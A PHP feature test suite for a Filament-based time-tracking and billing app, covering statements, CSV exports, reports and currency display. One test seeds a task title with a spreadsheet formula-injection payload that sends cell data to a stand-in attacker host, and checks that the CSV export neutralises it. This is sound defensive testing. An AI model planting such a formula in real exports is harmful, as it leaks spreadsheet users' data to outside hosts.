<?php

declare(strict_types=1);

namespace Tests\Feature\Filament;

use App\Actions\Billing\CreateStatement;
use App\Enums\StatementStatus;
use App\Filament\Pages\Reports;
use App\Filament\Pages\Unbilled;
use App\Filament\Resources\Statements\Pages\ViewStatement;
use App\Filament\Resources\Tasks\Pages\ListTasks;
use App\Filament\Resources\TimeEntries\Pages\ManageTimeEntries;
use App\Filament\Widgets\FinanceOverview;
use App\Filament\Widgets\Reports\ReportBreakdown;
use App\Filament\Widgets\Reports\ReportRates;
use App\Filament\Widgets\Reports\ReportStats;
use App\Models\Client;
use App\Models\Statement;
use App\Models\Task;
use App\Models\TimeEntry;
use App\Models\User;
use App\Reporting\RateHistory;
use App\Support\Period;
use Filament\Actions\Testing\TestAction;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Livewire\Component;
use Livewire\Features\SupportTesting\Testable;
use Livewire\Livewire;
use Tests\TestCase;

final class FinanceUiTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        // Mid-month, so factory entries from yesterday fall into "this month".
        $this->travelTo(now()->setDate(2026, 10, 15)->setTime(12, 0));
        $this->actingAs(User::factory()->create());
    }

    public function test_creates_a_statement_from_the_unbilled_list_and_refuses_mixing_clients(): void
    {
        $task = Task::factory()->create();
        TimeEntry::factory()->count(2)->create(['task_id' => $task]);
        $other = Task::factory()->create();
        TimeEntry::factory()->create(['task_id' => $other]);

        Livewire::test(Unbilled::class)
            ->assertCanSeeTableRecords([$task, $other])
            ->callAction(TestAction::make('createStatement')->table()->bulk(), ['until' => null], ['records' => [$task->id, $other->id]])
            ->assertNotified(__('A statement is for one client. Select work of a single client.'));

        $this->assertSame(0, Statement::query()->count());

        Livewire::test(Unbilled::class)
            ->selectTableRecords([$task->id])
            ->callAction(TestAction::make('createStatement')->table()->bulk(), ['until' => null]);

        $this->assertSame(240_000, Statement::query()->sole()->items()->sole()->amount);
    }

    public function test_downloads_sends_and_cancels_from_the_statement_page(): void
    {
        $entry = TimeEntry::factory()->create(['note' => 'Přihlášení přes SSO']);
        $statement = app(CreateStatement::class)->handle($entry->task->client, [$entry->task]);

        Livewire::test(ViewStatement::class, ['record' => $statement->id])
            ->callAction('downloadPdf')
            ->assertFileDownloaded("vykaz-prace-{$statement->id}.pdf")
            ->callAction('send', ['sent_on' => '2026-10-01'])
            ->assertHasNoActionErrors();
        $this->assertSame(StatementStatus::Sent, $statement->refresh()->status);

        Livewire::test(ViewStatement::class, ['record' => $statement->id])
            ->callAction('cancel');
        $this->assertSame(StatementStatus::Cancelled, $statement->refresh()->status);
        $this->assertFalse($entry->isAllocated());
    }

    public function test_adds_selected_time_entries_to_a_new_draft(): void
    {
        $task = Task::factory()->create();
        $a = TimeEntry::factory()->create(['task_id' => $task]);
        $b = TimeEntry::factory()->create(['task_id' => $task]);

        Livewire::test(ManageTimeEntries::class)
            ->selectTableRecords([$a->id])
            ->callAction(TestAction::make('addToStatement')->table()->bulk(), ['statement_id' => null]);

        $this->assertTrue($a->isAllocated());
        $this->assertFalse($b->isAllocated());
    }

    public function test_edits_a_note_inline_only_while_the_entry_is_not_on_a_statement(): void
    {
        $free = TimeEntry::factory()->create();
        $billed = TimeEntry::factory()->create(['note' => 'old']);

        Livewire::test(ManageTimeEntries::class)
            ->selectTableRecords([$billed->id])
            ->callAction(TestAction::make('addToStatement')->table()->bulk(), ['statement_id' => null])
            ->call('updateTableColumnState', 'note', (string) $free->id, 'Code review')
            ->call('updateTableColumnState', 'note', (string) $billed->id, 'new');

        $this->assertSame('Code review', $free->fresh()?->note);
        $this->assertSame('old', $billed->fresh()?->note);
    }

    public function test_exports_time_entries_respecting_the_active_filter_with_bom_and_czech_numbers(): void
    {
        $acme = Client::factory()->create(['name' => 'Acme']);
        TimeEntry::factory()->lasting(5400)->create(['task_id' => Task::factory()->create(['client_id' => $acme, 'title' => 'Žluťoučký kůň']), 'note' => 'a;b']);
        TimeEntry::factory()->create(['task_id' => Task::factory()->create(['title' => 'Other client'])]);

        $csv = $this->downloadedCsv(Livewire::test(ManageTimeEntries::class)
            ->filterTable('client', $acme->id)
            ->callAction('exportCsv'));

        $this->assertStringStartsWith("\xEF\xBB\xBF", $csv);
        $this->assertStringContainsString('Žluťoučký kůň', $csv);
        $this->assertStringContainsString('"a;b"', $csv);
        $this->assertStringContainsString(';1,50;', $csv);
        $this->assertStringContainsString(';1800,00;CZK;', $csv);
        $this->assertStringNotContainsString('Other client', $csv);
    }

    public function test_exports_tasks_and_neutralises_spreadsheet_formulas(): void
    {
        Task::factory()->fixed(500_000)->create(['title' => 'Webhook']);
        Task::factory()->create(['title' => '=HYPERLINK("https://evil.example/?d="&A1)']);
        Task::factory()->create(['title' => '-42']);

        $csv = $this->downloadedCsv(Livewire::test(ListTasks::class)->callAction('exportCsv'));

        $this->assertStringContainsString('Webhook', $csv);
        $this->assertStringContainsString('5000,00', $csv);
        $this->assertStringContainsString(";\"'=HYPERLINK(", $csv);
        $this->assertStringContainsString(';-42;', $csv);
    }

    public function test_reports_by_client_with_historical_rates(): void
    {
        $task = Task::factory()->create(['client_id' => Client::factory()->create(['name' => 'Report Client'])]);
        TimeEntry::factory()->lasting(3600)->create(['task_id' => $task]);
        $task->client->update(['hourly_rate' => 150_000]);
        $task->unsetRelation('client');
        TimeEntry::factory()->lasting(3600)->create(['task_id' => $task]);

        $rates = RateHistory::for(Period::thisMonth());

        $this->assertSame([120_000, 150_000], array_column($rates, 'rate'));
        $this->assertSame([120_000, 150_000], array_column($rates, 'amount'));

        $filters = ['range' => 'this_month', 'client' => $task->client_id];

        $this->get(Reports::getUrl(['filters' => $filters]))->assertOk();
        Livewire::test(ReportBreakdown::class, ['pageFilters' => $filters, 'dimension' => 'client_id'])
            ->assertSee('Report Client')
            ->assertSee('2:00')
            ->assertSee(__('Real rate'));
        Livewire::test(ReportRates::class, ['pageFilters' => $filters])
            ->assertSee("1\u{00A0}200\u{00A0}Kč/h")
            ->assertSee("1\u{00A0}500\u{00A0}Kč/h");
        Livewire::test(ReportStats::class, ['pageFilters' => $filters])->assertSee('2:00 h');
    }

    public function test_overview_keeps_each_currency_on_its_own_line(): void
    {
        TimeEntry::factory()->lasting(3600)->create(['task_id' => Task::factory()->create(['client_id' => Client::factory()->create(['hourly_rate' => 120_000])])]);
        TimeEntry::factory()->lasting(3600)->create(['task_id' => Task::factory()->create(['client_id' => Client::factory()->eur()->create(['hourly_rate' => 6_000])])]);

        Livewire::test(FinanceOverview::class)->assertSee("1\u{00A0}200\u{00A0}Kč<br>60\u{00A0}€", false);
    }

    /** @param Testable<Component> $response */
    private function downloadedCsv(Testable $response): string
    {
        $content = (string) ($response->effects['download']['content'] ?? '');

        return base64_decode($content, true) ?: $content;
    }
}
